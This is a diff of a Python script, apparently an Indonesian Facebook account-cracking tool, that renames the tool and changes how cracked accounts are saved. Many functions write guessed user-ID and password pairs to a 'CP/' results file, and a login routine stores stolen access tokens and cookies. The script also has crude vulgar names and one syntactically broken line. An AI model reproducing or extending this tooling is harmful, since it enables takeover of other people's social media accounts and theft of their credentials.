@@ -640,7 +640,7 @@ def login_lagi334():
 							print(f"\n [+] Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n [+] Login Berhasil | python BrayennnFB.py");exit()
+							print("\n [+] Login Berhasil | python Kertas.py");exit()
 			except Exception as e:
 				print(" [+] Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -1383,7 +1383,7 @@ def validate2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+cektahun'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1541,7 +1541,7 @@ def reguler1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1629,7 +1629,7 @@ def reguler2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1717,7 +1717,7 @@ def reguler3(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1806,7 +1806,7 @@ def kontol(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1895,7 +1895,7 @@ def bapi(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1965,7 +1965,7 @@ def colmek1(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2035,7 +2035,7 @@ def colmek2(idf,pwv):
 					tree.add(f"[bold yellow]{idf}|{pw}")
 					tree.add(f"[bold yellow]{ua}")
 					cetak(tree) 
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
